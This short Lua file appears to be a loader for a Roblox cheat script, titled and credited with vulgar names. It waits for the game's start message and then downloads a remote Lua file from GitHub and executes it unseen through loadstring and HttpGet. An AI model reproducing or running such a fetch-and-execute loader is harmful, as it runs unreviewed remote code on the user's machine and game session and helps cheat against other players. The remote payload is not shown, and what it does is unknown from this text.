local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
task.spawn(function() local PlayerGui = LocalPlayer:WaitForChild("PlayerGui") local LoadScreen = PlayerGui:WaitForChild("LoadScreen") local LoadMenu = LoadScreen:WaitForChild("LoadMenu") local Navigation = LoadMenu:WaitForChild("Navigation") local StateLabel = Navigation:WaitForChild("State")
    StateLabel:GetPropertyChangedSignal("Text"):Connect(function() if StateLabel.Text == "GAME IS STARTING!" then task.wait(3)
        -- loading string here
          loadstring(game:HttpGet("https://raw.githubusercontent.com/sanyogsakenkok/AnalDestroyerScript/main/main.lua"))()
        end
    end)
end)


              -- Anal Destroyer Script
              -- Created by: SanyokSuckenCock and GlebASS
              -- Version: [ 2.6.0 ]

              -- [ Last Changed ]
              -- nothing rn...
